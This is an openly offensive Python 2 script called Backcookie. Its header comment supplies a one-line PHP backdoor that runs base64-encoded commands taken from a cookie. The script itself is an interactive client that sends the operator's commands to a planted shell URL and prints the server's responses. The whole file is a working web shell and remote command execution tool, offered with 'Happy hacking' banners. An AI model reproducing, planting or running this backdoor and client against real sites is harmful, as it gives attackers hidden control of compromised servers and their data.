#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#       
#          Copyright 2013 - 2014 @mrjopino  <mrjopino@hotmail.com>
#    
# 
###############################################
import os                                     #
import sys                                    #
from sys import argv                          #
from urllib2 import build_opener, HTTPHandler #
############################################################################
#                                                                          #
# Code: <?php error_reporting(0); system(base64_decode($_COOKIE["1"])); ?> #
# Va con un rango de 1 a 0, pero al igual puedes especificar parametros.   #
# Example: python backcookie.py http://target.com/shell.php                #
#                                                                          #
# Puedes cambiar el nombre de la cookie, en la linea 45.                   #
# el valor 1 por el nombre de tu cookie, tambien en php.                   #
# Example: system(base64_decode($_COOKIE["yourcookie"]));                  ###
# para que la conexion sea exitosa.                                          #
#                                                                            #
# Backcookie es como la gente que encuentra el amor de su vida cada 2 meses. #
##############################################################################
#
#BackCookie
#
if "linux" in sys.platform:
    os.system("clear")
elif "win" in sys.platform:
    os.system("cls")
else:
    pass

class color:
    azul = '\033[94m'
    rojo = '\033[91m'
    blanco = '\033[0m'

def backcookie(comando, a, debugLevel=0):
    o = build_opener(HTTPHandler(debuglevel=debugLevel))
    o.addheaders = [
        ('User-Agent', a),
        ('Cookie', '1={0}'.format(comando.encode('base64'))),
    ]
    l = o.open(argv[1])
    print color.azul + l.read().strip() + color.blanco

def main():
    print "\t\t-------------\033[91mBackcookie\033[0m------------"
    print "\t\t+    Developed by: @mrjopino      +"
    print "\t\t+             To play             +"
    print "\t\t-----------------------------------\n\n"
    print "\033[92m[+]\033[94m Happy hacking\033[0m"
    print "\033[92m[+]\033[94m Aveces no es sierto, pero aveces si!\033[0m"

    a = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; "
    a = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; "   
    a = "WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; "
    a = ".NET CLR 3.0.30729; .NET CLR 3.5.30729; "
    a = "Media Center PC 6.0; .NET4.0C; .NET4.0E; "
    a = "Mozilla/5.0 (Windows; U; Windows NT 5.1; "
    a = "Mozilla/5.0 (Windows; U; Windows NT 6.0; "
    a = "Mozilla/5.0 (X11; U; Linux i686; "
    a = "Mozilla/5.0 (Android; Mobile; "
    a = "Mozilla/5.0 (Android; Tablet; "

    while True:
        
        comando = raw_input("pwned:~$ ")
        if comando != "exit": #salir
            backcookie(comando, a)
        else:
            print color.rojo + "Backcookie OFF" + color.blanco
            break

        if comando != "dev": #developer
            backcookie(comando, a)
        else:
            print "\t\t-------------\033[94mDeveloper\033[0m------------"
            print "\t\t+        José Pino (Fraph)       +"
            print "\t\t+       Security researcher      +"
            print "\t\t+            @mrjopino           +"
            print "\t\t----------------------------------\n\n"

if __name__ == "__main__":
    main()
